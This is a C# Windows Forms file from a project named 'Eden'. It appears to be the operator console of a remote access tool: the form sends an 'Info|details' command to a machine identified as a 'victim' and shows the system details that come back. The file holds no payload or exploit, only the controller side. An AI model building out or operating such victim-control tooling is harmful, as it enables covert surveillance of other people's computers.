using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmInformation : Form
    {
        public Client m_clnt;
        public string szVictimID;

        public frmInformation()
        {
            InitializeComponent();
        }

        void Received(Client clnt, string szVictimID, string[] aMsg)
        {
            if (szVictimID != this.szVictimID)
                return;

            if (aMsg[0] == "info")
            {
                if (aMsg[1] == "details")
                {
                    foreach (string szJson in Tools.EZData.String2OneDList(aMsg[2]))
                    {
                        Invoke(new Action(() =>
                        {
                            Dictionary<string, JsonElement> dic = Tools.EZData.JsonStr2Dic(szJson);
                            foreach (string szKey in dic.Keys)
                            {
                                richTextBox1.AppendText($"{szKey}: {dic[szKey].ToString()}{Environment.NewLine}");
                            }

                            richTextBox1.AppendText($"{string.Concat(Enumerable.Repeat("-", 100))}{Environment.NewLine}");
                        }));
                    }
                }
            }
        }

        void setup()
        {
            if (m_clnt == null)
            {
                MessageBox.Show("m_clnt is null.");
                Close();
            }

            richTextBox1.Text = string.Empty;

            m_clnt.ServerMessageReceived += Received;
            m_clnt.SendVictim(szVictimID, "Info|details");
        }

        private void frmInformation_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void frmInformation_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_clnt.ServerMessageReceived -= Received;
        }
    }
}
